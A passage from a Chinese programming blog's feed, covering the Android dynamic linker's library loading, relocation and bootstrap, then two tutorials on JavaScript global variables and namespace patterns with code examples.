title="Library定位"></a>Library定位</h4><p>动态链接器从<em>load_tasks中</em>提取一个名称/路径，如果它是绝对路径，则直接打开，否则将遍历<em>LSPath</em>来寻找该库。</p><p>找到并打开该库后，它可能是<em>系统库</em>或<em>应用程序库</em>。<em>系统库</em>是从系统库路径如<code>/system/lib</code>; <em>应用程序库</em>是从应用程序库路径（如）加载的<code>/data/data/com.example.app/lib</code>。</p><p>在从Zygote派生应用程序之前，动态链接程序仅在系统库路径下搜索库。在应用程序派生并设置了库路径之后，动态链接器首先在应用程序路径下搜索，然后在系统库路径下搜索。</p><h4 id="Library加载"><a href="#Library加载" class="headerlink" title="Library加载"></a>Library加载</h4><p>从存储中打开库之后，并且在将库加载到内存中之前，链接器要验证刚刚打开的文件是否为有效的共享库。它根据ELF数据执行检查：magic number，32/64位，小/大字节序，机器类型等。如果有任何错误，该库和<em>库依赖项</em>将被卸载。</p><p>如果验证通过，则动态链接器将读取库头并将所有可装入的段加载到内存中。它通过检查<code>PT_LOAD</code>程序头表来计算所需的库内存大小。内存分配只是通过<code>mmap</code>。（在<a href="https://android.googlesource.com/platform/bionic/+/android-2.3_r1/linker/linker.c"><em>Jelly Bean</em></a>之前和之前，库内存由<a href="https://en.wikipedia.org/wiki/Buddy_memory_allocation">伙伴内存分配系统</a>系统管理）</p><h4 id="Library预链接"><a href="#Library预链接" class="headerlink" title="Library预链接"></a>Library<em>预链接</em></h4><p>“预链接”旨在通过读取<em>库的依赖</em>关系（动态<code>DT_NEEDED</code>部分）来建立一个更高级别的<em>库依赖</em>关系。<code>DT_NEEDED</code>表中记录的所有库名称均添加到<em>load_tasks中</em>并进行加载。</p><p>可以很容易地看到，在加载库时，相同的库（名称）可能会多次添加到<em>load_tasks中</em>。动态链接器会在打开该库之前和之后遍历<em>ALList，</em>以检查该库是否已通过名称和<em>索引</em>节点（i-node）加载到内存中。如果找到，动态链接器将删除该<em>load_tasks</em>节点，然后进行下一步获取。因此，<em>ALList</em>中没有重复加载的库。</p><p>在Android的整个开发过程中，库的读取依赖项的发生时间已更改。在<em>Lollipop-MR1</em>之前，库链接是DFS，它以递归方式加载和链接<em>库依赖关系</em>。从<em>Lollipop-MR1</em>开始，库将更改链接到BFS。此更改使库链接一个两阶段的过程，<em>库相关性中的</em>所有库都在重定位之前已加载到内存中。</p><h3 id="Library-Relocation程序"><a href="#Library-Relocation程序" class="headerlink" title="Library Relocation程序"></a>Library Relocation程序</h3><p>库加载过程完成后，库的依赖关系记录在<em>soinfo中</em>。动态链接器读取以root开头的<em>soinfo</em>来建造<em>local_group</em>。重定位在<em>local_group</em>上<em>执行</em>。重定位主循环将库从<em>local_group</em> 出队并查找。<em>local_group</em>是根据BFS构建的，因此重定位也是BFS。</p><p>当解析一个库的符号时，动态链接器会遍历<em>Relocation Section</em>，这是共享库中需要重新放置（<code>DT_REL</code>或<code>DT_RELA</code>ELF）所有内容的表。对于每个重定位条目，链接器都会读取符号索引并将其转换为符号名称。使用该名称，链接器在依赖关系树中搜索它的定义-从库本身开始，然后是<em>global_group</em>（请参见“动态链接器的扩展”）和<em>local_group</em>。在库中搜索符号定义时，动态链接程序将检查其符号表（<code>DT_SYMTAB</code>ELF）。有一种用于表查找的加速方法，<code>DT_HASH</code>ELF是一个散列表，其中包含库的所有“已导出”或“已导入”符号。</p><p>库重定位过程很直观。完成后，动态链接器将调用依赖项中的所有库构造函数。构造函数完成后，将加载库，动态链接器会将此库的处理程序返回给用户。</p><h2 id="扩展动态链接器"><a href="#扩展动态链接器" class="headerlink" title="扩展动态链接器"></a>扩展动态链接器</h2><p>动态链接具有一些扩展以支持各种情况，而Android则针对特定目的扩展了动态链接功能。</p><h3 id="通用动态链接"><a href="#通用动态链接" class="headerlink" title="通用动态链接"></a>通用动态链接</h3><h4 id="Global-Library"><a href="#Global-Library" class="headerlink" title="Global Library"></a>Global Library</h4><p>当一个库被声明为“全局库”并加载了标志时<code>RTLD_GLOBAL</code>，该库的符号定义对于之后加载的所有库具有**<em>最高优先级**</em>。</p><p>每次加载库时，Android动态链接器都会在每次开始时构建<em>global_group</em>。重定位符号时，首先查找<em>global_group-</em> “全局库”可以覆盖之后要加载的库的符号定义。</p><h4 id="Preload库"><a href="#Preload库" class="headerlink" title="Preload库"></a>Preload库</h4><p>当二进制文件带有标志执行时<code>LD_PRELOAD</code>。这些库将在二进制文件真正执行之前加载。Android动态链接器在初始化时会预加载这些库。这些库将带有该标志<code>RTLD_GLOBAL</code>。之后，“预加载库”就像“全局库”。<code>LD_PRELOAD</code>仅对纯native程序有效。</p><h3 id="Android扩展动态链接"><a href="#Android扩展动态链接" class="headerlink" title="Android扩展动态链接"></a>Android扩展动态链接</h3><p>Android系统扩展了动态链接，以改善从Java和本机加载库时的体验。该API是<code>android_dlopen_ext()</code>。直到M，此扩展程序的功能如下所示，其中大多数功能都很容易理解。只需从源文件中复制…。</p><p>该扩展的数据结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  uint64_t flags;</span><br><span class="line">  void*   reserved_addr;</span><br><span class="line">  size_t  reserved_size;</span><br><span class="line">  int     relro_fd;</span><br><span class="line">  int     library_fd;</span><br><span class="line">  off64_t library_fd_offset;</span><br><span class="line">&#125; android_dlextinfo;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="与库内存相关"><a href="#与库内存相关" class="headerlink" title="与库内存相关"></a>与库内存相关</h4><blockquote><p>**<code>ANDROID_DLEXT_RESERVED_ADDRESS</code>**：设置后，<code>reserved_addr</code>and<code>reserved_size</code>字段必须指向地址空间的一个已经保留的区域，如果合适，该区域将用于加载库。如果保留区域不够大，则加载将失败。</p></blockquote><blockquote><p>**<code>ANDROID_DLEXT_RESERVED_ADDRESS_HINT</code>**：作为DLEXT_RESERVED_ADDRESS，但是如果保留区域不够大，则链接器将改为选择可用地址。</p></blockquote><h4 id="Library打开相关"><a href="#Library打开相关" class="headerlink" title="Library打开相关"></a>Library打开相关</h4><blockquote><p>**<code>ANDROID_DLEXT_USE_LIBRARY_FD</code>**：指示dlopen使用<code>library_fd</code>而不是按名称打开文件。filename参数仍用于标识库。</p></blockquote><blockquote><p>**<code>ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET</code>**：如果使用打开图书馆，<code>library_fd</code>请从开始阅读<code>library_fd_offset</code>。该标志仅在<code>ANDROID_DLEXT_USE_LIBRARY_FD</code>设置时有效。</p></blockquote><blockquote><p>**<code>ANDROID_DLEXT_FORCE_LOAD</code>**：设置后，请勿检查文件stat（2）s是否已加载该库。如果由于某些原因多个ELF文件共享相同的文件名（例如，由于已经加载并删除了已加载的库），则此标志允许强制加载该库。请注意，如果该库具有与旧库相同的dt_soname，而其他库在<code>DT_NEEDED</code>列表中具有该soname ，则第一个库将用于解析任何依赖项。</p></blockquote><h4 id="Library-relocation相关"><a href="#Library-relocation相关" class="headerlink" title="Library relocation相关"></a>Library relocation相关</h4><blockquote><p>**<code>ANDROID_DLEXT_WRITE_RELRO</code>**：设置后，请<code>relro_fd</code>在执行重定位后将映射库的GNU RELRO部分写入，以允许另一进程在相同地址加载相同库时重用它。这意味着<code>ANDROID_DLEXT_USE_RELRO</code>。</p></blockquote><blockquote><p>**<code>ANDROID_DLEXT_USE_RELRO</code>**：设置后，<code>relro_fd</code>在执行重定位后，将映射库的GNU RELRO部分与进行比较，并替换与从文件映射的版本相同的所有重定位页面。</p></blockquote><h2 id="动态链接器的引导程序"><a href="#动态链接器的引导程序" class="headerlink" title="动态链接器的引导程序"></a>动态链接器的引导程序</h2><p>动态链接器旨在“链接”所有可重定位的二进制文件，并且必须使其自身看起来像<code>libdl.so</code>可重定位的<code>libdl.so</code>二进制文件-二进制文件只是一个使<code>ld</code>编译器工具链满意的虚拟库。动态链接器在编译时是静态链接的，除了系统调用外不依赖任何其他资源。自我定位和伪造的<code>libdl.so</code>是<em>Bootstrap</em>。</p><p>Android动态链接器的引导分为两个步骤：</p><ol><li>初始化：硬编码以重新定位链接器本身。</li><li>初始化后：准备“链接器运行时”以加载库。</li></ol><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>在此阶段，所有执行的代码都将静态重定位。没有外部变量，外部函数或GOT访问。从调用<code>begin.S</code>，之后将调用Post-initialize函数。主要操作是重定位链接器本身并创建虚拟<code>libdl.so</code> <em>soinfo</em>。</p><p>重定位链接器本身是一个悲伤的故事，每件事都是手工获得的。在对<em>soinfo进行正确设置</em>（主要与内存相关）之后，便会进行真正的重定位。然后调用链接器的构造函数以初始化链接器的全局变量。</p><p>主要设置创建虚拟<code>libdl.so</code> <em>soinfo的</em>过程，并将<em>soinfo</em>的引用更新为硬编码数组，例如符号表。的<em>soinfo</em>节点<code>libdl.so</code>始终是<em>ALList</em>的第一个节点。</p><p>完成这些工作后，链接器将重新定位。</p><h3 id="后初始化"><a href="#后初始化" class="headerlink" title="后初始化"></a>后初始化</h3><p>在自我重定位后，动态链接程序将<em>重</em>定位<em>somain</em>（主进程）Zygote。</p><p>在重定位Zygote之前，链接器会从系统（如<code>LD_LIBRARY_PATH</code>和）中请求运行时变量<code>LD_PRELOAD</code>。然后，它重新安置了Zygote。Zygote重定位后，加载在中声明的所有库<code>LD_PRELOAD</code>。完成所有操作后，链接器完成<em>Bootstrap</em>并跳转到Zygote。</p><h2 id="Library依赖"><a href="#Library依赖" class="headerlink" title="Library依赖"></a>Library依赖</h2><p>如开头所述，动态链接器的一项任务是重新构建<em>库依赖项</em>。在某些特殊情况下，重建过程对运行时环境敏感。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-38f9ca731c7a688b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Android的Tricky库依赖关系生成"></p><p>考虑到有两组库*-set1<em>和</em>set2<em>。这两个集合中的某些库共享相同的名称，但具有不同的定义。首先，只能加载</em>set1<em>，然后可以加载</em>set1<em>和</em>set2<em>。诀窍是，无论如何依赖，在阶段1中加载的库只能依赖</em>set1中的<em>库，如上图所示。这是因为每当需要</em>set1中的<em>库时，动态链接程序都将简单地重用它的</em>soinfo*。</p><p><code>LD_PRELOAD</code>在传统的Linux中，在Android的Zygote分支之前加载的库就是这种情况。对于大多数开发人员来说，这很好，但是可能会影响某些仿真系统。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>动态链接器重新构建可执行文件的依赖关系，查找，加载和链接它。它是现代操作系统的基本基础结构，并且对运行环境敏感。动态链接通常是在高端平台上定制的，并且需要* bootstrap*。</p><p><a href="https://developer.android.com/preview/behavior-changes.html#ndk">Android N包括名称空间更改，以防止加载非公共API</a>。此功能严重影响了Android的生态系统。从理论上讲，<em>名称空间</em>可以在动态链接中实现“虚拟化”。我们在本文档中的“内部流程”中讨论了动态链接，而<em>名称空间</em>可以构建多个虚拟空间-<em>名称空间</em>-在一个流程中进行动态链接，从而使动态链接成为“内部名称空间”。将来我们将引用<em>命名空间</em>。（请参阅<a href="https://jackwish.net/2017/namespace-based-dynamic-linking.html">基于命名空间的动态链接</a>）</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript全局变量的声明方法</title>
      <link href="/2020/11/23/Javascript%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%A3%B0%E6%98%8E%E6%96%B9%E6%B3%95/"/>
      <url>/2020/11/23/Javascript%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E5%A3%B0%E6%98%8E%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>转自：<a href="https://blog.csdn.net/yboker/article/details/8171195">JS中如何定义全局变量</a></p><h1 id="1-在js的function外定义一个变量"><a href="#1-在js的function外定义一个变量" class="headerlink" title="1.在js的function外定义一个变量"></a>1.在js的function外定义一个变量</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var name&#x3D;&#39;测试&#39;;</span><br><span class="line"></span><br><span class="line">function XX()&#123;</span><br><span class="line"></span><br><span class="line">       alert(name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-不使用var，直接给定义变量，隐式的声明了全局变量"><a href="#2-不使用var，直接给定义变量，隐式的声明了全局变量" class="headerlink" title="2.不使用var，直接给定义变量，隐式的声明了全局变量"></a>2.不使用var，直接给定义变量，隐式的声明了全局变量</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#39;测试&#39;;</span><br><span class="line"></span><br><span class="line">function XX()&#123;</span><br><span class="line"></span><br><span class="line">  alert(name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法，即使该变量是在一个function内，当该function被执行后它变成了全局变量 —- 但是function不执行它就不被其他function知道，所以最好定义在function外</p><h1 id="3-使用window-变量名定义为全局变量"><a href="#3-使用window-变量名定义为全局变量" class="headerlink" title="3.使用window.变量名定义为全局变量"></a>3.使用window.变量名定义为全局变量</h1><p>但是注意：调用时候建议写上window.变量名，当然也可以不写；我们常用的document.getXXX的document对象就是window的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">window.name&#x3D;&#39;测试&#39;;</span><br><span class="line"></span><br><span class="line">function XX()&#123;</span><br><span class="line"></span><br><span class="line">  alert(window.name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局变量的优点：</p><p>可以减少变量的个数，减少由于实际参数和形式参数的数据传递带来的时间消耗。</p><p>全局变量的缺点：<br>（1）全局变量保存在静态存贮区，程序开始运行时为其分配内存，程序结束释放该内存。与局部变量的动态分配、动态释放相比，生存期比较长，因此过多的全局变量会占用较多的内存单元。<br>（2）全局变量破坏了函数的封装性能。函数象一个黑匣子，一般是通过函数参数和返回值进行输入输出，函数内部实现相对独立。但函数中如果使用了全局变量，那么函数体内的语句就可以绕过函数参数和返回值进行存取，这种情况破坏了函数的独立性，使函数对全局变量产生依赖。同时，也降低了该函数的可移植性。<br>（3）全局变量使函数的代码可读性降低。由于多个函数都可能使用全局变量，函数执行时全局变量的值可能随时发生变化，对于程序的查错和调试都非常不利。<br>因此，如果不是万不得已，最好不要使用全局变量。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript namespace 创建方法</title>
      <link href="/2020/11/23/Javascript-namespace-%E5%88%9B%E5%BB%BA%E6%96%B9%E6%B3%95/"/>
      <url>/2020/11/23/Javascript-namespace-%E5%88%9B%E5%BB%BA%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>全局变量的使用应该引起注意，只有系统范围相关的对象才声明为全局变量， 并且避免命名冲突。 比较好的减少全局变量的策略是创建少量的全局对象，这些对象将用作基础模块和子系统的namespace(命名空间)。下面将介绍几种namespace的创建方法。</p><h1 id="静态namespace"><a href="#静态namespace" class="headerlink" title="静态namespace"></a>静态namespace</h1><p>静态namespace是hard coded， 可以将一个namespace赋值给另一个namespace， 两个namespace将引用相同的对象。</p><h2 id="1-直接赋值"><a href="#1-直接赋值" class="headerlink" title="1.直接赋值"></a>1.直接赋值</h2><p>直接赋值是最基本的方法，这种方法比较费时费力，如果想重新命名，需要花费一番功夫。 但是这种方法却很安全和明确。方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var myApp &#x3D; &#123;&#125;</span><br><span class="line"> </span><br><span class="line">myApp.id &#x3D; 0;</span><br><span class="line"> </span><br><span class="line">myApp.next &#x3D; function() &#123;</span><br><span class="line">    return myApp.id++;  </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">myApp.reset &#x3D; function() &#123;</span><br><span class="line">    myApp.id &#x3D; 0;   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">window.console &amp;&amp; console.log(</span><br><span class="line">    myApp.next(),</span><br><span class="line">    myApp.next(),</span><br><span class="line">    myApp.reset(),</span><br><span class="line">    myApp.next()</span><br><span class="line">); &#x2F;&#x2F;0, 1, undefined, 0 </span><br></pre></td></tr></table></figure><p>通过使用它来引用同级属性，可以使以后的维护更容易，但是这有点冒险，因为没有什么可以阻止重新分配name space的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var myApp &#x3D; &#123;&#125;</span><br><span class="line"> </span><br><span class="line">myApp.id &#x3D; 0;</span><br><span class="line"> </span><br><span class="line">myApp.next &#x3D; function() &#123;</span><br><span class="line">    return this.id++;   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">myApp.reset &#x3D; function() &#123;</span><br><span class="line">    this.id &#x3D; 0;    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">myApp.next(); &#x2F;&#x2F;0</span><br><span class="line">myApp.next(); &#x2F;&#x2F;1</span><br><span class="line">var getNextId &#x3D; myApp.next;</span><br><span class="line">getNextId(); &#x2F;&#x2F;NaN whoops!</span><br></pre></td></tr></table></figure><h2 id="2-使用object-literal表示法"><a href="#2-使用object-literal表示法" class="headerlink" title="2.使用object literal表示法"></a>2.使用object literal表示法</h2><p>如果我们只使用一次命名空间，切换命名空间就比较容易，但有时候命名空间的值还是会出乎意料。我们可以假设定义在命名空间构造函数里面的对象的值不会被重新赋值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var myApp &#x3D; &#123;</span><br><span class="line"> </span><br><span class="line">    id: 0,</span><br><span class="line"> </span><br><span class="line">    next: function() &#123;</span><br><span class="line">        return this.id++;   </span><br><span class="line">    &#125;,</span><br><span class="line"> </span><br><span class="line">    reset: function() &#123;</span><br><span class="line">        this.id &#x3D; 0;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">window.console &amp;&amp; console.log(</span><br><span class="line">    myApp.next(),</span><br><span class="line">    myApp.next(),</span><br><span class="line">    myApp.reset(),</span><br><span class="line">    myApp.next()</span><br><span class="line">) &#x2F;&#x2F;0, 1, undefined, 0</span><br></pre></td></tr></table></figure><h2 id="3-模块模式"><a href="#3-模块模式" class="headerlink" title="3.模块模式"></a>3.模块模式</h2><p>通过函数包装器（通常是自调用）将逻辑与全局范围隔离开，该函数包装器返回表示模块公共接口的对象。 通过立即调用该函数并将结果分配给名称空间变量，我们将模块的API锁定在名称空间中。 此外，未包含在返回值中的所有变量将永远保持私有状态，仅对引用它们的公共函数可见。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var myApp &#x3D; (function() &#123;</span><br><span class="line"> </span><br><span class="line">    var id&#x3D; 0;</span><br><span class="line"> </span><br><span class="line">    return &#123;</span><br><span class="line">        next: function() &#123;</span><br><span class="line">            return id++;    </span><br><span class="line">        &#125;,</span><br><span class="line"> </span><br><span class="line">        reset: function() &#123;</span><br><span class="line">            id &#x3D; 0;     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;)();   </span><br><span class="line"> </span><br><span class="line">window.console &amp;&amp; console.log(</span><br><span class="line">    myApp.next(),</span><br><span class="line">    myApp.next(),</span><br><span class="line">    myApp.reset(),</span><br><span class="line">    myApp.next()</span><br><span class="line">) &#x2F;&#x2F;0, 1, undefined, 0  </span><br></pre></td></tr></table></figure><p>像上面的object literal 示例一样，可以很容易地切换接收名称空间，还有其他优点：object literal 是固定的–它全部与属性分配有关，没有空间支持逻辑, 此外，object literal 必须初始化所有属性，并且属性值不能轻易相互引用（因此，内部闭包是不可能的）。 模块模式不受这些限制，并为我们带来了私有性的额外好处。</p><h1 id="动态namespace"><a href="#动态namespace" class="headerlink" title="动态namespace"></a>动态namespace</h1><p>我们也可以称此部分为namespace注入。 namespace由在函数包装器内直接引用的代理表示–这意味着我们不再需要捆绑返回值来分配给名称空间。 这使名称空间定义更加灵活，并使在独立的名称空间（甚至在全局上下文中）存在模块的多个独立实例变得非常容易。 动态命名空间支持模块模式的所有功能，并具有直观易读的附加优势。</p><h2 id="4-提供name-space参数"><a href="#4-提供name-space参数" class="headerlink" title="4.提供name space参数"></a>4.提供name space参数</h2><p>在这里，我们只是将namespace作为参数传递给自调用函数。 id变量是私有的，因为它没有分配给context。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var myApp &#x3D; &#123;&#125;;</span><br><span class="line">(function(context) &#123; </span><br><span class="line">    var id &#x3D; 0;</span><br><span class="line"> </span><br><span class="line">    context.next &#x3D; function() &#123;</span><br><span class="line">        return id++;    </span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    context.reset &#x3D; function() &#123;</span><br><span class="line">        id &#x3D; 0;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;)(myApp);  </span><br><span class="line"> </span><br><span class="line">window.console &amp;&amp; console.log(</span><br><span class="line">    myApp.next(),</span><br><span class="line">    myApp.next(),</span><br><span class="line">    myApp.reset(),</span><br><span class="line">    myApp.next()</span><br><span class="line">) &#x2F;&#x2F;0, 1, undefined, 0  </span><br></pre></td></tr></table></figure><p>我们甚至可以将context设置为全局对象（只需更改一个单词！）。 对于图书馆供应商来说，这是一笔巨大的财富–他们可以将其功能包装在一个自调用功能中，然后由用户决定是否应该是全局的（John Resig在编写JQuery时就是这个概念的早期采用者）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var myApp &#x3D; &#123;&#125;;</span><br><span class="line">(function(context) &#123; </span><br><span class="line">    var id &#x3D; 0;</span><br><span class="line"> </span><br><span class="line">    context.next &#x3D; function() &#123;</span><br><span class="line">        return id++;    </span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    context.reset &#x3D; function() &#123;</span><br><span class="line">        id &#x3D; 0;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;)(this);   </span><br><span class="line"> </span><br><span class="line">window.console &amp;&amp; console.log(</span><br><span class="line">    next(),</span><br><span class="line">    next(),</span><br><span class="line">    reset(),</span><br><span class="line">    next()</span><br><span class="line">) &#x2F;&#x2F;0, 1, undefined, 0  </span><br></pre></td></tr></table></figure><h2 id="5-将this用作namespace代理"><a href="#5-将this用作namespace代理" class="headerlink" title="5.将this用作namespace代理"></a>5.将this用作namespace代理</h2><p>詹姆斯·爱德华兹（James Edwards）发表的一篇文章。 “我最喜欢的JavaScript设计模式”显然被许多人误解了，他们认为他最好还是采用模块模式。<br>模式的优点在于它仅使用设计的语言，仅此而已。 而且，由于名称空间是通过this关键字注入的（在给定的执行上下文中是静态的），因此不能修改它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var myApp &#x3D; &#123;&#125;;</span><br><span class="line">(function() &#123;</span><br><span class="line">    var id &#x3D; 0;</span><br><span class="line"> </span><br><span class="line">    this.next &#x3D; function() &#123;</span><br><span class="line">        return id++;    </span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    this.reset &#x3D; function() &#123;</span><br><span class="line">        id &#x3D; 0;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;).apply(myApp);    </span><br><span class="line"> </span><br><span class="line">window.console &amp;&amp; console.log(</span><br><span class="line">    myApp.next(),</span><br><span class="line">    myApp.next(),</span><br><span class="line">    myApp.reset(),</span><br><span class="line">    myApp.next()</span><br><span class="line">); &#x2F;&#x2F;0, 1, undefined, 0</span><br></pre></td></tr></table></figure><p>更好的是，apply（和call）API提供了上下文和参数的自然分隔–因此，将附加参数传递给模块创建者是非常干净的。 下面的示例演示了这一点，还显示了如何在多个名称空间上独立运行模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var subsys1 &#x3D; &#123;&#125;, subsys2 &#x3D; &#123;&#125;;</span><br><span class="line">var nextIdMod &#x3D; function(startId) &#123;</span><br><span class="line">    var id &#x3D; startId || 0;</span><br><span class="line"> </span><br><span class="line">    this.next &#x3D; function() &#123;</span><br><span class="line">        return id++;    </span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    this.reset &#x3D; function() &#123;</span><br><span class="line">        id &#x3D; 0;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">nextIdMod.call(subsys1);    </span><br><span class="line">nextIdMod.call(subsys2,1000);   </span><br><span class="line"> </span><br><span class="line">window.console &amp;&amp; console.log(</span><br><span class="line">    subsys1.next(),</span><br><span class="line">    subsys1.next(),</span><br><span class="line">    subsys2.next(),</span><br><span class="line">    subsys1.reset(),</span><br><span class="line">    subsys2.next(),</span><br><span class="line">    subsys1.next()</span><br><span class="line">) &#x2F;&#x2F;0, 1, 1000, undefined, 1001, 0</span><br></pre></td></tr></table></figure><p>当然，如果我们想要一个全局id生成器，那么轻而易举……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nextIdMod();    </span><br><span class="line"> </span><br><span class="line">window.console &amp;&amp; console.log(</span><br><span class="line">    next(),</span><br><span class="line">    next(),</span><br><span class="line">    reset(),</span><br><span class="line">    next()</span><br><span class="line">) &#x2F;&#x2F;0, 1, undefined, 